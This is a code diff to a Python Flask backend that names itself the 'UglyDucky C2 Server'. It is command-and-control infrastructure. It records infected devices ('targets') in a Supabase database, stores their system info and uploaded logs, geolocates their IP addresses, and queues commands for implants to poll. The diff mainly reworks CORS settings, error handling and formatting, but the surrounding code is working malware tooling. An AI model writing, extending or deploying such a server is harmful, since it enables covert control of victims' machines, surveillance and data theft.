@@ -2,38 +2,27 @@
 import os
 import json
 import requests
-import traceback
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from datetime import datetime, timedelta, timezone
 
 app = Flask(__name__)
 
-# --- BULLETPROOF CORS & ERROR HANDLING ---
-# 1. Enable base CORS
-CORS(app, resources={r"/*": {"origins": "*"}})
+# --- STRICT CORS CONFIGURATION ---
+# This explicitly allows the dashboard to communicate with Render, 
+# explicitly permitting our custom password header.
+CORS(app, resources={
+    r"/*": {
+        "origins": "*",
+        "methods": ["GET", "POST", "OPTIONS", "PUT", "DELETE"],
+        "allow_headers": ["Content-Type", "Authorization", "X-Dashboard-Password", "x-dashboard-password", "Accept"]
+    }
+})
 
-# 2. Force headers on every response, even if the app crashes internally.
-@app.after_request
-def force_cors(response):
-    response.headers['Access-Control-Allow-Origin'] = '*'
-    response.headers['Access-Control-Allow-Headers'] = '*'
-    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
-    return response
-
-# 3. Catch all preflight OPTIONS requests directly
-@app.route('/', defaults={'path': ''}, methods=['OPTIONS'])
-@app.route('/<path:path>', methods=['OPTIONS'])
-def handle_options(path):
-    return '', 204
-
-# 4. If python code crashes, send JSON back instead of HTML so the frontend can read the error.
+# Catch backend crashes and return them as JSON so the dashboard can read them.
 @app.errorhandler(Exception)
 def handle_exception(e):
-    print(f"CRASH: {str(e)}")
     return jsonify({"error": f"Backend Error: {str(e)}"}), 500
-
-# ==================================================================
 
 # Credentials from Render Environment Variables
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
@@ -52,33 +41,24 @@ file_download_cache = {}
 def get_node_status(last_seen_str):
     if not last_seen_str: 
         return "red", "Offline"
-        
     try:
         last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
         now = datetime.now(timezone.utc)
-        
-        if now - last_seen < timedelta(minutes=2): 
-            return "green", "Online"
-        if now - last_seen < timedelta(hours=1): 
-            return "yellow", "Idle"
-    except ValueError:
-        pass
-        
+        if now - last_seen < timedelta(minutes=2): return "green", "Online"
+        if now - last_seen < timedelta(hours=1): return "yellow", "Idle"
+    except ValueError: pass
     return "red", "Offline"
 
 def geolocate_ip(ip):
     if not ip or ip.startswith("127.") or "Unknown" in ip: 
         return 28.5383, -81.3792 
-        
     try:
         response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
         if response.ok:
             data = response.json()
             if data.get("status") == "success":
                 return float(data.get("lat")), float(data.get("lon"))
-    except:
-        pass
-        
+    except: pass
     return 28.5383, -81.3792 
 
 # ---------------------------------------------------------
@@ -90,23 +70,21 @@ def get_single_node(device_id):
         return jsonify({"error": "Unauthorized: Password mismatch"}), 401
 
     if not SUPABASE_KEY or not SUPABASE_URL:
-        return jsonify({"error": "Missing SUPABASE_URL or SUPABASE_KEY in Render Env Vars!"}), 500
+        return jsonify({"error": "Missing SUPABASE_URL or SUPABASE_KEY in Render Vars!"}), 500
 
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
     
     try:
-        # Fetch timestamp
         time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
         response = requests.get(time_url, headers=headers, timeout=10)
         response.raise_for_status()
         device_data = response.json()
 
         if not device_data or not isinstance(device_data, list) or len(device_data) == 0:
-            return jsonify({"error": f"Device ID '{device_id}' not found in database."}), 404
+            return jsonify({"error": f"Target ID '{device_id}' not found in Supabase database."}), 404
 
         last_seen = device_data[0].get('created_at', '')
         
-        # Fetch sysinfo
         sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
         sysinfo_resp = requests.get(sysinfo_url, headers=headers, timeout=10)
         
@@ -122,7 +100,10 @@ def get_single_node(device_id):
         status_color, _ = get_node_status(last_seen)
         lat, lng = geolocate_ip(ip_info)
         
-        return jsonify({"id": device_id, "os": os_info, "ip": ip_info, "lat": lat, "lng": lng, "status": status_color, "last_seen": last_seen})
+        return jsonify({
+            "id": device_id, "os": os_info, "ip": ip_info, 
+            "lat": lat, "lng": lng, "status": status_color, "last_seen": last_seen
+        })
 
     except requests.exceptions.RequestException as e:
         return jsonify({"error": f"Supabase Connection Failed: {str(e)}"}), 500
@@ -191,7 +172,7 @@ def push_logs():
     try:
         requests.post(upsert_url, json=data, headers=headers, timeout=15)
         return jsonify({"status": "success"}), 200
-    except Exception: return jsonify({"error": "Database push failed"}), 500
+    except Exception as e: return jsonify({"error": f"Database push failed: {str(e)}"}), 500
 
 @app.route('/issue', methods=['POST'])
 def issue_command():
@@ -204,7 +185,9 @@ def poll_for_command(device_id):
     return jsonify({"command": command_queue.pop(device_id, None)})
 
 @app.route('/')
-def index(): return "UglyDucky C2 Server is Online."
+def index(): 
+    return "UglyDucky C2 Server is Online."
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
